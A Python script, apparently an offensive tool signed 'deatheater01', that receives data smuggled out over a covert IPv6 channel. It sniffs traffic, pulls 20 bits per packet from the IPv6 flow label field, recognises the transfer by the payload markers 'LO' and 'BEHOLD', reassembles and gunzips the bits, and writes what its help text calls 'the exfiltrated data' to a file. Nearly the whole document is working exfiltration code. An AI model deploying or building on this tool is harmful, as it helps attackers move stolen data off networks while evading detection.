import argparse

from scapy.all import *
from scapy.layers.inet6 import IPv6


class Receiver:
    PACKET_LEN = 20
    MAGIC_VALUE = "LO"
    END_VALUE = "BEHOLD"
    DISPLAY_INTERVAL_SECONDS = 10

    def __init__(self, output_file):
        self.output_file = output_file
        self.raw_bits = {}
        self.largest_seq_num = 0
        self.start_time = None
        self.transmission_in_progress = False
        self.bits_to_receive = None
        self.bits_read = 0
        self.last_display_time = None
        self.data = None

    @staticmethod
    def bitfield(n, pad_len=PACKET_LEN):
        
        bits = [int(digit) for digit in bin(n)[2:]]
        padded_bits = [0] * (pad_len - len(bits)) + bits
        return padded_bits

    def decode(self, bits, total_len):
        """
        Takes a list of received bits, and decodes them
        """
        pos = 0
        raw_bytes = []
        assert len(bits) >= total_len
        while pos < self.bits_to_receive:
            curr_byte = bits[pos:pos + 8]
            raw_bytes.append(int("".join([str(b) for b in curr_byte]), 2))
            pos += 8

        gz_stream = gzip.GzipFile(fileobj=io.BytesIO(bytearray(raw_bytes)), mode="r")
        final_data = gz_stream.read()

        return final_data

    def data_packet_process(self, pkt):
        payload = pkt[Raw].load.decode()
        if not self.transmission_in_progress:
            self.last_display_time = time.time()
            self.bits_to_receive = int(payload.split("_")[1])
            print(
                f"[+] Receiving {self.bits_to_receive // 8} bytes ({self.bits_to_receive} bits) from {pkt[IPv6].src}...",
                file=sys.stderr
            )
            self.start_time = time.time()
            self.transmission_in_progress = True

        payload_int = pkt[IPv6].fl
        seq_num = int(payload.split("_")[-1])
        self.raw_bits[seq_num] = self.bitfield(payload_int)
        self.bits_read += self.PACKET_LEN
        self.largest_seq_num = max(self.largest_seq_num, seq_num)
        if time.time() - self.last_display_time > self.DISPLAY_INTERVAL_SECONDS:
            percent_completed = round(100.0 * self.bits_read / self.bits_to_receive, 1)
            print(f"[-] {percent_completed}% completed ({self.bits_read}/{self.bits_to_receive} bits)", file=sys.stderr)
            self.last_display_time = time.time()

    def process_terminate_packet(self, pkt):
        if len(self.raw_bits) + 1 < self.largest_seq_num:
            print("[!] Error: some packets were dropped during transmission", file=sys.stderr)
            exit(1)

        raw_bits_in_order = []
        for i in sorted(self.raw_bits):
            raw_bits_in_order.extend(self.raw_bits[i])

        self.data = self.decode(raw_bits_in_order, self.bits_to_receive)
        num_bytes_transferred = len(raw_bits_in_order) // 8
        time_elapsed = round(time.time() - self.start_time, 2)
        print(f"[+] Transferred {num_bytes_transferred} bytes in {time_elapsed} seconds", file=sys.stderr)

    def is_finale_packet(self, pkt):
        return pkt.haslayer(Raw) and pkt[Raw].load.decode() == self.END_VALUE

    def process_packet(self, pkt):
        if pkt.haslayer(Raw) and pkt[Raw].load.decode().startswith(self.MAGIC_VALUE):
            self.data_packet_process(pkt)
            return

        
        elif self.is_finale_packet(pkt):
            self.process_terminate_packet(pkt)
            return

    def receive(self,):
        print("[-] Started receiver")
        sniff(
            filter="ip6 and not icmp6",
            prn=self.process_packet,
            stop_filter=self.is_finale_packet,
            store=0
        )
        return self.data


def main():
    parser = argparse.ArgumentParser(formatter_class=argparse.ArgumentDefaultsHelpFormatter)

    parser.add_argument(
        "output_file",
        help="File to which to write the exfiltrated data"
    )

    args = parser.parse_args()
    receiver = Receiver(args.output_file)
    data = receiver.receive()
    if data is None:
        print("[!] Transfer failed or was interrupted", file=sys.stderr)
        exit(1)

    open(args.output_file, 'wb').write(data)
    print(f"[+] Data written to {sys.argv[1]}\n", file=sys.stderr)


if __name__ == "__main__":
    print("""
███████╗██╗░░░██╗██████╗░░█████╗░░██████╗████████╗░█████╗░░██████╗
██╔════╝██║░░░██║██╔══██╗██╔══██╗██╔════╝╚══██╔══╝██╔══██╗██╔════╝
█████╗░░╚██╗░██╔╝██████╔╝██║░░██║╚█████╗░░░░██║░░░██║░░██║╚█████╗░
██╔══╝░░░╚████╔╝░██╔══██╗██║░░██║░╚═══██╗░░░██║░░░██║░░██║░╚═══██╗
███████╗░░╚██╔╝░░██║░░██║╚█████╔╝██████╔╝░░░██║░░░╚█████╔╝██████╔╝
╚══════╝░░░╚═╝░░░╚═╝░░╚═╝░╚════╝░╚═════╝░░░░╚═╝░░░░╚════╝░╚═════╝░

    -deatheater01""")
    main()
